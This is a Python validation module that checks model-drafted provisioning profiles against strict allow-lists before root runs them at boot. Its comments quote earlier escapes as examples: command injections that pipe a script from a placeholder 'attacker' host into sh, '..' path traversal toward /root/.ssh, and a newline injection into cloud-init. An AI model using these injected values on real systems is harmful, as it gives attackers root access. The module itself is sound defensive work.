"""What a technology profile may contain, enforced identically in both services.

WHY THIS IS A SHARED MODULE, AND WHY IT IS STRICT.

A technology profile is JSON that becomes commands root runs on a machine at
first boot: a URL root fetches, a directory root unpacks into, a user root
creates, a systemd unit root starts. With AI_MODE=live that JSON is written by a
model. It is, in the most literal sense, remote code execution by design — the
whole feature is "fetch this and run it" — so the only thing separating intended
execution from arbitrary execution is what these rules allow through.

An adversarial review on 2026-08-22 demonstrated three working escapes from the
first version of those rules, which checked string PREFIXES:

  url  = "https://x/y.tgz; curl http://attacker/x | sh"   starts with https://
  dest = "/opt/../.."                                      starts with /opt/
  unit.exec_start = "/bin/true\\nruncmd:\\n  - \\"touch /tmp/pwned\\""

The first two ran as root; the third injected a whole new cloud-init file (the
reviewer demonstrated writing /root/.ssh/authorized_keys). A fully weaponised
profile returned ZERO findings. The renderer's cmd() helper quotes each command
for YAML — it says nothing about the shell, and I mistook one for the other.

So: WHOLE-VALUE ALLOW-LISTS, never prefixes. Every field is matched against a
pattern describing exactly what it may be, and anything else is refused with a
reason. Three locks, because a profile reaching a machine passes three doors:
the API's linter refuses to publish it, the orchestrator refuses to load it, and
the renderer shell-quotes what survives. Any one of those failing alone should
not be enough.
"""

from __future__ import annotations

import re

# https only, no credentials, no query, and no character that means anything to a
# shell. A URL is fetched by root and its contents executed; the host is the only
# variable part that needs expressing, and everything else is attack surface.
URL = re.compile(r"^https://[A-Za-z0-9][A-Za-z0-9.\-]{0,252}(:\d{1,5})?"
                 r"(/[A-Za-z0-9._~\-/%+]*)?$")

# One path segment that CANNOT be `.` or `..`, because it must contain at least
# one character that is not a dot. Stated once and reused, so the two confined
# paths in this file cannot drift apart.
#
# CORRECTED 2026-08-24, and it was a live traversal, not a tidy-up. The previous
# construction was `(?!\.\.?$)[A-Za-z0-9._-]+` per segment, whose lookahead is
# anchored to END OF STRING — so it rejected a TRAILING `..` and nothing else:
#
#     /opt/../..                  refused    <- the only case ever tested
#     /opt/../../etc              ACCEPTED
#     /opt/a/../../../root/.ssh   ACCEPTED   <- root unpacks a tarball here,
#                                               then chown -R's it
#
# The adversarial review of 2026-08-22 tested the trailing form, it was refused,
# and the comment above this line then claimed `..` was "impossible by
# construction". It was not. Found on 2026-08-24 while writing the equivalent
# rule for container data directories, by testing the middle position rather
# than the end.
_SEGMENT = r"[A-Za-z0-9._\-]*[A-Za-z0-9_\-][A-Za-z0-9._\-]*"

# Add-on software lives under /opt, one or more plain path segments deep.
DEST = re.compile(rf"^/opt/{_SEGMENT}(?:/{_SEGMENT})*$")

# A system account name, as useradd will accept it.
USER = re.compile(r"^[a-z_][a-z0-9_\-]{0,31}$")

# A sha256 digest, lowercase hex, exactly 64 characters.
SHA256 = re.compile(r"^[0-9a-f]{64}$")

# A catalogue technology code. Hyphens are allowed because the catalogue has
# them (oracle-db, service-mesh) — see report_key for why they cannot travel
# into a report key unchanged.
CODE = re.compile(r"^[a-z0-9](?:[a-z0-9._\-]{0,46}[a-z0-9])?$")

# systemd ExecStart: an absolute path plus arguments, on ONE line. It is written
# into a YAML block scalar, so a newline ends the scalar early and injects
# structure into the cloud-config; and it is read by systemd, not a shell, so
# shell metacharacters would not do what a model writing them expects anyway.
EXEC_START = re.compile(r"^/[\x20-\x7E]{0,511}$")

# One line of printable ASCII, for a unit description.
DESCRIPTION = re.compile(r"^[\x20-\x7E]{1,200}$")

# A version command: a program (absolute path or bare name), its arguments, and
# optionally a redirect of stderr — which most of these tools need, because they
# announce their version there. NOT a general shell command.
#
# It runs as root inside the machine's report script, as `RAW=$(...)`. Merging
# generated profiles into that script is a change made today; before it, no
# agent-written value reached it at all, and `version_command = "true; curl
# http://attacker/rk.sh | sh"` would have piped an attacker's script to root at
# the end of boot — after the proof had already decided the machine was healthy.
VERSION_COMMAND = re.compile(
    r"^(?:/[A-Za-z0-9._/\-]+|[A-Za-z0-9._\-]+)"      # the program
    r"(?: +[A-Za-z0-9._=:/\-]+)*"                     # its arguments
    r"(?: +2>&1)?$")                                  # stderr, where versions live

ENV_KEY = re.compile(r"^[A-Z_][A-Z0-9_]{0,63}$")
ENV_VALUE = re.compile(r"^[\x20-\x7E]{0,512}$")

# The only archive format the renderer can unpack. Declared here rather than
# discovered on the machine: a profile pinning a .zip (HashiCorp ships Vault
# that way) would fetch, fail to unpack, and be withdrawn as an uncertifiable
# recipe when the defect is in our renderer. Refusing it up front says which.
ARCHIVE_SUFFIXES = (".tar.gz", ".tgz")

# A vendor repository definition file, e.g.
# https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo
#
# THE THIRD WAY TO INSTALL SOFTWARE, and the one whose absence sent REQ-2026-0184
# to manual fulfilment: `dnf install vault` finds nothing on Oracle Linux because
# HashiCorp ships Vault from its own repository, not Oracle's. The same is true
# of MongoDB, Elasticsearch, SQL Server and RabbitMQ — most of what remains
# uncertified in this catalogue.
#
# Adding a repository is MORE dangerous than fetching one archive, not less: it
# does not install one verified file, it tells the package manager to trust a
# publisher for everything it offers, now and at every future update. So the
# rules are stricter — https, and a GPG key, without exception.
REPO_SUFFIXES = (".repo",)

# The only repositories that may be enabled by installing a release package.
# See repo_problems() for why this is a closed set and not a pattern.
RELEASE_PACKAGES = frozenset({"oracle-epel-release-el9", "epel-release"})

# --- containers (C8) ---------------------------------------------------------
#
# The registries an image may be pulled from. A CLOSED SET, for the same reason
# RELEASE_PACKAGES is one: pulling an image is executing whatever that publisher
# put in it, as whatever user the image declares. A pattern like "any host ending
# in .io" would let a drafted profile — or a name read off a machine's report —
# point root at anything.
#
# ocir is Oracle's own registry, reachable over the service gateway, and is here
# so images can be mirrored under your control rather than pulled anonymously
# from a public host on every boot.
REGISTRIES = frozenset({
    "docker.io", "quay.io", "ghcr.io",
    "me-dubai-1.ocir.io", "ocir.me-dubai-1.oci.oraclecloud.com",
})

# The repository path inside a registry: `library/rabbitmq`, `keycloak/keycloak`.
# Lowercase by OCI distribution rules; no `..`, by the same construction DEST
# uses — a segment must contain at least one non-dot character.
IMAGE_PATH = re.compile(
    rf"^{_SEGMENT}(?:/{_SEGMENT}){{0,4}}$")

# An image tag. Informational only — the DIGEST is what is pulled — but it still
# reaches a command line, so it is bounded.
IMAGE_TAG = re.compile(r"^[A-Za-z0-9_][A-Za-z0-9._\-]{0,127}$")

# Service data lives under /var/lib, on its own block volume. Confined exactly
# as add-on software is confined to /opt.
DATA_DIR = re.compile(rf"^/var/lib/{_SEGMENT}(?:/{_SEGMENT})*$")

# Fields a container profile may declare. ANYTHING ELSE IS REFUSED, and that is
# the whole security argument for this rung: the renderer builds the podman
# command from validated fields, and a profile can never supply a flag. If it
# could, `--privileged` or `-v /:/host` would end the discussion, and no
# allow-list on the image name would save you.
# A path INSIDE the container, which is where the data volume is mounted. Less
# confined than DATA_DIR because the location is the image's business — Postgres
# wants /var/lib/postgresql/data, RabbitMQ /var/lib/rabbitmq — but it is half of
# a `-v host:container` argument, so a colon or a shell character in it would
# change what is mounted rather than where.
MOUNT_PATH = re.compile(rf"^/{_SEGMENT}(?:/{_SEGMENT})*$")

CONTAINER_FIELDS = frozenset({"image", "tag", "digest", "data_dir",
                              "data_mount", "environment"})


def report_key(code: str) -> str:
    """The identifier form of a technology code, for a `key=value` report line.

    boot_reports.verdict() only parses a line whose key `isidentifier()`, and
    catalogue codes contain hyphens — so `archive_oracle-db=failed` was read as
    healthy and thrown away. Sanitising here keeps the machine's failure legible
    to the one function that judges it.
    """
    return re.sub(r"[^0-9A-Za-z_]", "_", code or "")


def archive_problems(archive: dict, *, declares_services: bool) -> list[str]:
    """Every reason this archive spec may not be handed to a machine.

    Empty means it may. The messages are written for whoever reads a refusal,
    which may be an agent redrafting: each says what was wrong and what shape is
    acceptable.
    """
    problems: list[str] = []
    if not isinstance(archive, dict):
        return ["The archive is not an object."]

    url = archive.get("url")
    if not isinstance(url, str) or not URL.match(url):
        problems.append(
            f"The archive URL {url!r} is not an acceptable https URL. Root fetches "
            f"this address and executes what is there, so it must be https and "
            f"may contain only letters, digits and ._~-/%+ — no spaces, no shell "
            f"characters, no credentials, no query string.")
    elif not url.lower().endswith(ARCHIVE_SUFFIXES):
        problems.append(
            f"The archive URL ends in something other than "
            f"{' or '.join(ARCHIVE_SUFFIXES)}. The renderer unpacks with "
            f"`tar -xzf` and cannot open a zip or an xz archive; pinning one "
            f"would fail on every machine and look like a bad recipe rather than "
            f"an unsupported format.")

    dest = archive.get("dest")
    if not isinstance(dest, str) or not DEST.match(dest):
        problems.append(
            f"The unpack destination {dest!r} is not an acceptable path. It must "
            f"be under /opt with plain path segments; `/opt/../..` reaches the "
            f"base system, and tar would write an attacker-shaped tree over it "
            f"as root.")

    sha = archive.get("sha256")
    if not isinstance(sha, str) or not SHA256.match(sha):
        # A BLOCKER, not a warning. This was a warning for one afternoon, on the
        # reasoning that TLS plus a sandbox bounded it. TLS authenticates the
        # host a profile NAMES; it says nothing about whether that host serves
        # the software the profile claims, and with a model choosing the host
        # that is the entire question. Nothing unverified gets executed by root.
        problems.append(
            f"The archive has no usable sha256 (got {sha!r}). Root executes what "
            f"this fetches, and a checksum is the only thing that says the bytes "
            f"are the ones somebody vouched for — TLS only proves the host is the "
            f"host. Provide a lowercase 64-character digest measured from the "
            f"actual artifact.")

    user = archive.get("user")
    if user is not None and (not isinstance(user, str) or not USER.match(user)):
        problems.append(
            f"The service user {user!r} is not an acceptable account name; it is "
            f"passed to useradd and chown as root.")

    unit = archive.get("unit")
    if unit is None or unit == {}:
        if declares_services:
            problems.append(
                "The profile starts a service but the archive declares no systemd "
                "unit, and no package installs one — enable would fail on a unit "
                "that does not exist.")
    elif not isinstance(unit, dict):
        problems.append(f"The archive unit is {type(unit).__name__}, not an object.")
    else:
        exec_start = unit.get("exec_start")
        if not isinstance(exec_start, str) or not EXEC_START.match(exec_start):
            problems.append(
                f"The unit ExecStart {exec_start!r} is not acceptable: it must be "
                f"a single line of printable ASCII beginning with an absolute "
                f"path. It is written into a YAML block scalar, so a newline ends "
                f"the scalar and injects structure into the machine's whole "
                f"first-boot configuration.")
        description = unit.get("description")
        if description is not None and (not isinstance(description, str)
                                        or not DESCRIPTION.match(description)):
            problems.append("The unit description must be one line of printable ASCII.")
        environment = unit.get("environment")
        if environment is not None:
            if not isinstance(environment, dict):
                problems.append(
                    f"The unit environment is {type(environment).__name__}, not an "
                    f"object of NAME: value pairs.")
            else:
                for key, value in environment.items():
                    if not isinstance(key, str) or not ENV_KEY.match(key):
                        problems.append(f"Environment name {key!r} is not acceptable.")
                    if not isinstance(value, str) or not ENV_VALUE.match(str(value)):
                        problems.append(
                            f"Environment value for {key!r} must be one line of "
                            f"printable ASCII.")
    return problems


def repo_problems(repo: dict) -> list[str]:
    """Every reason this vendor repository may not be added to a machine.

    A repository is a standing grant of trust: every package it offers, and every
    update to them, is installed by root on this machine's say-so. That is a
    larger thing to hand out than one checksummed archive, so `gpgcheck` is not
    optional and neither is the key.
    """
    problems: list[str] = []
    if not isinstance(repo, dict):
        return ["The repository is not an object."]

    # A REPOSITORY THAT ARRIVES AS A PACKAGE, not as a URL (C7).
    #
    # EPEL is how a large class of RHEL-family software is actually delivered,
    # and it is enabled by installing a release package rather than by fetching
    # a .repo file — so the URL rules above cannot express it at all.
    #
    # A CLOSED SET, deliberately, and this is the whole security argument. The
    # name is handed to dnf as root, and the point of a release package is that
    # it installs a repository definition AND its signing key in one step — so
    # "any package whose name ends in -release" would let a drafted profile
    # nominate an arbitrary publisher and have root trust it permanently. These
    # two are Oracle's and Fedora's own, signed by keys the image already
    # trusts. Adding a third is a decision a person makes, not a model.
    release = repo.get("release_package")
    if release is not None:
        # `isinstance` FIRST. `release not in RELEASE_PACKAGES` raises
        # TypeError on an unhashable value, and a model returning
        # `"release_package": []` would take down the drafting endpoint with a
        # 500 rather than being refused — the same shape as the malformed
        # `unit` that once made the archive linter throw AttributeError. A
        # linter that crashes on bad input is not a linter.
        if not isinstance(release, str) or release not in RELEASE_PACKAGES:
            problems.append(
                f"{release!r} is not a repository release package this portal "
                f"will install. A release package installs a repository AND its "
                f"signing key, so root would trust that publisher for every "
                f"package it ever serves. Allowed: "
                f"{', '.join(sorted(RELEASE_PACKAGES))}.")
        if repo.get("url") or repo.get("gpg_key"):
            # One mechanism or the other. Both would mean two repositories added
            # under one declaration, only one of which anything validated.
            problems.append(
                "The repository declares both a release package and a URL. It "
                "must be one or the other, so that what was checked is what is "
                "added.")
        return problems

    url = repo.get("url")
    if not isinstance(url, str) or not URL.match(url):
        problems.append(
            f"The repository URL {url!r} is not an acceptable https URL. The "
            f"package manager will trust this publisher for everything it "
            f"offers, so it must be https and free of shell characters.")
    elif not url.lower().endswith(REPO_SUFFIXES):
        problems.append(
            f"The repository URL must point at a .repo definition file (as "
            f"https://rpm.releases.hashicorp.com/RHEL/hashicorp.repo does), not "
            f"at {url!r}.")

    key = repo.get("gpg_key")
    if not isinstance(key, str) or not URL.match(key):
        # NOT OPTIONAL, unlike an archive's checksum being merely strongly
        # preferred. A checksum verifies one file once; a signing key is what
        # verifies every package this repository will ever serve. Adding a
        # repository without one tells dnf to install whatever arrives.
        problems.append(
            f"The repository declares no GPG key over https (got {key!r}). A "
            f"checksum verifies one file once; a signing key is what verifies "
            f"every package this repository will ever serve, including updates "
            f"nobody has looked at. Adding a repository without one tells the "
            f"package manager to install whatever arrives.")

    return problems


def container_problems(container: dict) -> list[str]:
    """Every reason this image may not be pulled and run on a machine.

    PULLING AN IMAGE IS EXECUTING WHAT A PUBLISHER PUT IN IT. That makes this
    closer to an archive than to a package — one specific artifact, fetched and
    run — so it gets an archive's discipline: a pinned digest, without exception,
    from a source in a closed set.

    THE FIELD ALLOW-LIST IS THE WHOLE ARGUMENT. A profile declares data, never
    flags, and the renderer builds the podman command from what is validated
    here. If a profile could contribute to that command line, `--privileged` or
    `-v /:/host` would end the discussion and no amount of care over the image
    name would matter. An unrecognised key is therefore REFUSED rather than
    ignored — ignoring it is how a field nobody validated comes to be rendered
    later by someone who assumed it had been.
    """
    problems: list[str] = []
    if not isinstance(container, dict):
        return ["The container declaration is not an object."]

    unknown = sorted(set(container) - CONTAINER_FIELDS)
    if unknown:
        problems.append(
            f"The container declares {', '.join(repr(u) for u in unknown)}, which "
            f"this portal does not render. A container profile carries DATA, not "
            f"command-line flags. Allowed: {', '.join(sorted(CONTAINER_FIELDS))}.")

    image = container.get("image")
    if not isinstance(image, str) or "/" not in image:
        problems.append(
            f"The image {image!r} must be fully qualified as <registry>/<path>, "
            f"e.g. docker.io/library/rabbitmq. An unqualified name lets the "
            f"machine's own registry search decide where root fetches from.")
    else:
        registry, _, path = image.partition("/")
        if registry not in REGISTRIES:
            problems.append(
                f"{registry!r} is not a registry this portal pulls from. Running "
                f"an image is running whatever its publisher put in it, so the "
                f"list is closed rather than a pattern. Allowed: "
                f"{', '.join(sorted(REGISTRIES))}.")
        if not IMAGE_PATH.match(path):
            problems.append(
                f"The image path {path!r} is not acceptable; it is part of what "
                f"root pulls.")

    # MANDATORY, exactly as an archive checksum is mandatory and for the same
    # reason: TLS proves the registry is the one the profile NAMED, and with the
    # agent choosing that name the digest is the entire question. A tag is a
    # moving target — its publisher can repoint it after this was proved.
    digest = container.get("digest")
    if (not isinstance(digest, str) or not digest.startswith("sha256:")
            or not SHA256.match(digest[len("sha256:"):])):
        problems.append(
            f"The image declares no pinned sha256 digest (got {digest!r}). A tag "
            f"can be repointed after this recipe was proved, so what a proof "
            f"certified and what a request later installs would be different "
            f"things wearing the same name.")

    tag = container.get("tag")
    if tag is not None and (not isinstance(tag, str) or not IMAGE_TAG.match(tag)):
        problems.append(f"The image tag {tag!r} is not acceptable.")

    data_dir, data_mount = container.get("data_dir"), container.get("data_mount")
    if (data_dir is None) != (data_mount is None):
        problems.append(
            "A data directory needs both a host path and the path it is mounted "
            "at inside the container. One without the other mounts nothing, or "
            "mounts it nowhere.")
    if data_dir is not None and (not isinstance(data_dir, str)
                                 or not DATA_DIR.match(data_dir)):
        problems.append(
            f"The host data directory {data_dir!r} is not acceptable. Service "
            f"data lives under /var/lib, on its own block volume, the same way "
            f"add-on software is confined to /opt.")
    if data_mount is not None and (not isinstance(data_mount, str)
                                   or not MOUNT_PATH.match(data_mount)):
        problems.append(
            f"The in-container mount path {data_mount!r} is not acceptable; it "
            f"is half of a `-v host:container` argument.")

    env = container.get("environment")
    if env is not None:
        if not isinstance(env, dict):
            problems.append("The container environment is not an object.")
        else:
            for key, value in env.items():
                if not isinstance(key, str) or not ENV_KEY.match(key):
                    problems.append(f"Environment name {key!r} is not acceptable.")
                if not isinstance(value, str) or not ENV_VALUE.match(str(value)):
                    problems.append(
                        f"The value of {key!r} is not acceptable; it is written "
                        f"into a unit file read by systemd.")
    return problems


def profile_problems(profile: dict) -> list[str]:
    """Every reason this profile may not reach a machine. Empty means it may.

    Used by BOTH services: the API refuses to publish a profile with problems,
    and the orchestrator refuses to load one. A profile that somehow reaches the
    store without passing here is skipped rather than rendered, because the store
    is a directory and a directory is not an authority.
    """
    problems: list[str] = []
    if not isinstance(profile, dict):
        return ["The profile is not an object."]

    code = profile.get("code")
    if not isinstance(code, str) or not CODE.match(code):
        problems.append(
            f"The technology code {code!r} is not acceptable; it becomes a file "
            f"name, a systemd unit name and a key in the machine's own report.")

    families = [f for f in ("rhel", "debian") if isinstance(profile.get(f), dict)]
    if not families:
        problems.append(
            "The profile covers no OS family. Package and service names differ per "
            "family — Apache is `httpd` on Oracle Linux and `apache2` on Ubuntu — "
            "so a profile naming neither cannot install anything.")

    archive = profile.get("archive")
    declares_services = any(profile[f].get("services") for f in families)
    if archive is not None:
        problems += archive_problems(archive, declares_services=declares_services)

    repo = profile.get("repo")
    if repo is not None:
        problems += repo_problems(repo)

    container = profile.get("container")
    if container is not None:
        problems += container_problems(container)

    # IT MUST INSTALL SOMETHING RUNNABLE. Relaxing the packages rule for archives
    # briefly allowed a profile with no packages, no services and no ports: it
    # unpacked a tarball, started nothing, and reported healthy — a proof of
    # nothing, which is the failure this whole certification design exists to
    # prevent and which it had already reproduced twice that day.
    installs = (any(profile[f].get("packages") for f in families)
                or archive is not None or profile.get("container") is not None)
    if not installs:
        problems.append("The profile installs nothing: no packages and no archive.")
    if archive is not None and not declares_services:
        problems.append(
            "The profile unpacks an archive but starts nothing. A machine that "
            "installs software and runs none of it reports healthy while doing "
            "nothing, which is exactly what a proof must never certify.")

    for family in families:
        block = profile[family]
        for package in block.get("packages") or []:
            if not isinstance(package, str) or not CODE.match(package):
                problems.append(
                    f"Package name {package!r} on {family} is not acceptable; it "
                    f"is passed to the package manager as root.")
        for service in block.get("services") or []:
            if not isinstance(service, str) or not CODE.match(service):
                problems.append(
                    f"Service name {service!r} on {family} is not acceptable; it "
                    f"is passed to systemctl as root.")

    # The version command runs inside the machine's report script, as root, and
    # its output is compared with `expects` WHEN THERE IS ONE. A command with no
    # expectation is no longer silence: since 2026-08-23 the machine reports it
    # as UNPROMISED and a human reading the report sees the version that
    # actually arrived. What must never be missing is the command itself — that
    # is the question, and not asking it is what shipped Redis 6.2 under a
    # catalogue entry called "Redis 7".
    # A DIGEST-PINNED CONTAINER NEEDS NO VERSION COMMAND, and asking for one
    # invites a wrong answer rather than no answer. REQ-2026-0192 ran
    # `podman exec rabbitmq rabbitmq --version` and crun replied that no such
    # binary exists — and the obvious repair, reading the image's
    # org.opencontainers.image.version label, would have reported "24.04",
    # which is UBUNTU's version, not RabbitMQ's. A confidently wrong number is
    # worse than none: it is the `UNPROMISED (12)` line-number bug wearing a
    # different hat.
    #
    # What replaces it is STRONGER, not weaker. The machine compares the digest
    # it actually holds against the one pinned and reports match or MISMATCH, so
    # the identity of what is running is established exactly — which is more
    # than any version string can do. The Redis-6-sold-as-7 rule stands
    # everywhere it can still be broken.
    pinned_container = (isinstance(profile.get("container"), dict)
                        and str(profile["container"].get("digest") or "")
                        .startswith("sha256:"))
    command = profile.get("version_command")
    if pinned_container and not str(command or "").strip():
        pass
    elif not isinstance(command, str) or not command.strip():
        problems.append(
            "The profile gives no way to ask the machine what it actually "
            "received. A package called `redis` delivered Redis 6.2 while the "
            "catalogue promised Redis 7, and nothing noticed until somebody "
            "logged in.")
    elif not VERSION_COMMAND.match(command.strip()):
        problems.append(
            f"The version command {command!r} is not acceptable. It runs as root "
            f"inside the machine's own report script as `RAW=$(...)`, so it may "
            f"be a program and its arguments — optionally with `2>&1`, where most "
            f"of these tools announce their version — and nothing else. No "
            f"semicolons, pipes, substitutions or newlines.")
    elif archive is not None and not str(profile.get("expects") or "").strip():
        # REQUIRED ONLY WHEN THE PROFILE PINS A VERSION, which an archive does by
        # naming one release URL — so there is a specific answer and not
        # comparing it is the silence that shipped Redis 6.2 as Redis 7.
        #
        # A package profile is different and must not be caught by this: the OS
        # decides the version, and the shipped nginx template deliberately
        # carries a version_command with NO `expects` because the REQUESTER picks
        # the version and render() supplies it per request. Requiring it here
        # blocked every package guess — the cheap path that costs one sandbox
        # machine to confirm or refute a package name.
        problems.append(
            "The profile pins a specific release but declares no `expects`, so "
            "nothing compares what the machine reports with what was pinned. "
            "Declare the major version that release is.")

    return problems
